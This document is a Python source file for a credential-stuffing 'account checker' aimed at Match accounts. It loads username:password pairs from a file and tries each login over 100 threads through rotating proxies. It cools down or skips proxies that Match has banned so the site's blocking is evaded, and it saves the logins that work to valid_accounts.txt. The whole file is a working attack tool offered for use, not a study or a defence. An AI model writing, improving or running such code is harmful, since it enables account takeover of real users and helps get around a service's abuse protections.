from Match import MatchProxy, MatchException
from ProxyManager import ProxyManager
from multiprocessing.pool import ThreadPool
import ThreadSafe
import random
import urllib3

# Add proxy cooldown to avoid false negatives?
# Every proxy object will have a cooldown attribute, use a lock to choose a random proxy, check this attribute, and then set it if the proxy is not in cooldown mode.
# Then use a timer when finished with the proxy which will disabled the proxy cooldown after a certain interval.
# Remove bad proxies?
# Remove non american proxies?
# Use a class to do all of these over threads.
# Add program arguments or config file?
# Watch for remote disconnect error

# Change these accordingly.
# Stores the input file name.
input_file = 'accounts.txt'
# Stores the output file name.
output_file = 'valid_accounts.txt'
# Stores the proxy file name.
proxy_file = 'proxies.txt'
# Stores the thread count.
thread_count = 100
# Verbose mode.
verbose = True
# Enables or disables proxy cooldowns (will slow down program, may stop proxies from getting banned).
cooldown_proxies = True
# Proxy cooldown time in seconds (the higher the number the slower the program).
proxy_cooldown_time = 5
# Removes any bad proxies (could lead to loss of all proxies).
remove_bad_proxies = False

# Disables SSL warnings.
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# Creates a proxied API class.
def get_proxied_API():
	# Loops to find a valid proxy.
	while True:
		# To catch a proxy error.
		try:
			# Choses a random proxy.
			proxy = proxy_manager.random_proxy()
			# Creates a new instanace of the match API.
			match = MatchProxy(proxy.proxy)
			# If verbose is enabled.
			if verbose:
				# Notifies the user.
				ThreadSafe.thread_print('Found good proxy: {}.'.format(proxy))
			# Returns the object.
			return (match, proxy)
		# Catches a bad proxy.
		except (MatchException, IOError) as e:
			# If verbose is enabled.
			if verbose:
				# Notifies the user.
				ThreadSafe.thread_print('Skipping bad proxy: {}.'.format(proxy))
			# If proxy cooldowns are enabled.
			if cooldown_proxies:
				# Coolsdown the proxy.
				proxy_manager.proxy_cooldown(proxy, proxy_cooldown_time)
			else:
				# Unlocks the proxy.
				proxy_manager.unlock_proxy(proxy)
			# Tries another proxy
			continue

# Checks the given account to see if it's valid.
def check_account(userpass):
	# Loops for proxy validation.
	while True:
		# If verbose is enabled.
		if verbose:
			# Notifies the user.
			ThreadSafe.thread_print('Trying account: {}'.format(userpass))
		# To deal with match errors.
		try:
			# Creates a new instanace of the match API with a random proxy.
			match, proxy = get_proxied_API()
			# To catch a proxy error.
			try:
				
				# Logs into the given account.
				account = match.login(userpass[0], userpass[1])
			# Catches a bad proxy.
			except IOError as e:
				# If verbose is enabled.
				if verbose:
					# Notifies the user.
					ThreadSafe.thread_print('Proxy death: {}.'.format(proxy))
				# If proxy cooldowns are enabled.
				if cooldown_proxies:
					# Coolsdown the proxy.
					proxy_manager.proxy_cooldown(proxy, proxy_cooldown_time)
				else:
					# Unlocks the proxy.
					proxy_manager.unlock_proxy(proxy)
				# Tries again.
				continue
			# Constructs the account string.
			acc_str = '\n\nValid account found: {}\n{}'.format(userpass, account)
			# Notifies the user.
			ThreadSafe.thread_print(acc_str)
			# Writes the account to the output file.
			output.append(acc_str)
			# Breaks from the loop
			break
		# Catches a bad account error.
		except MatchException as e:
			# Invalid proxy (A US proxy that is banned by Match, or a coincidence).
			if str(e) == 'We\'re unable to reset your password, please try again in a few minutes. If you continue to experience problems, please contact Customer Care.':
				# If verbose is enabled.
				if verbose:
					# Notifies the user.
					ThreadSafe.thread_print('Skipping banned proxy: {}'.format(proxy))
				# If proxy cooldowns are enabled.
				if cooldown_proxies:
					# Coolsdown the proxy.
					proxy_manager.proxy_cooldown(proxy, proxy_cooldown_time)
				else:
					# Unlocks the proxy.
					proxy_manager.unlock_proxy(proxy)
				# Tries another proxy.
				continue
			# If verbose is enabled.
			if verbose:
				# Notifies the user.
				ThreadSafe.thread_print('Skipping bad account: {}.'.format(userpass))
			# Invalid account or the proxy is blocked by the server, either way there's no way to differentiate between them.
			break
	# If proxy cooldowns are enabled.
	if cooldown_proxies:
		# Coolsdown the proxy.
		proxy_manager.proxy_cooldown(proxy, proxy_cooldown_time)
	else:
		# Unlocks the proxy.
		proxy_manager.unlock_proxy(proxy)

# Checks the given account list for valid accounts.
def check_accounts(accounts):
	# If verbose is enabled.
	if verbose:
		# Notifies the user.
		print('Creating {} threads.'.format(thread_count))
	# Creates a thread pool of 100 workers.
	pool = ThreadPool(thread_count)
	# Maps the pool to the check account function.
	pool.map(check_account, accounts)

# Loads proxies.
def load_proxies(proxies_file):
	# Opens the proxies file.
	with open(proxies_file, 'r') as f:
		# Reads the proxies into a list.
		return [x.strip() for x in f.readlines()]

# Loads accounts
def load_accounts(accounts_file):
	# Opens the accounts file.
	with open(accounts_file, 'r') as f:
		# Reads the accounts into a list.
		return [x.strip().split(':') for x in f.readlines()]

if __name__ == '__main__':
	# If verbose is enabled.
	if verbose:
		# Notifies the user.
		print('Verbose mode enabled.')
		# Notifies the user.
		print('Loading accounts from: {}...'.format(input_file))
	# Loads the accounts.
	accounts = load_accounts(input_file)
	# If verbose is enabled.
	if verbose:
		# Notifies the user.
		print('Accounts loaded.')
		# Notifies the user.
		print('Loading proxies from: {}...'.format(proxy_file))
	# Loads the proxies.
	proxies = load_proxies(proxy_file)
	# Creates a new proxy manager with the proxies.
	proxy_manager = ProxyManager(proxies)
	# If verbose is enabled.
	if verbose:
		# Notifies the user.
		print('Proxies loaded.')
		# Notifies the user.
		print('Clearing the output file: {}...'.format(output_file))
	# Creates the output file.
	output = ThreadSafe.ThreadFile(output_file)
	# Clears the output file.
	output.clear()
	# If verbose is enabled.
	if verbose:
		# Notifies the user.
		print('Output file cleared.')
		# Notifies the user.
		print('Checking accounts...')
	# Checks the account list
	check_accounts(accounts)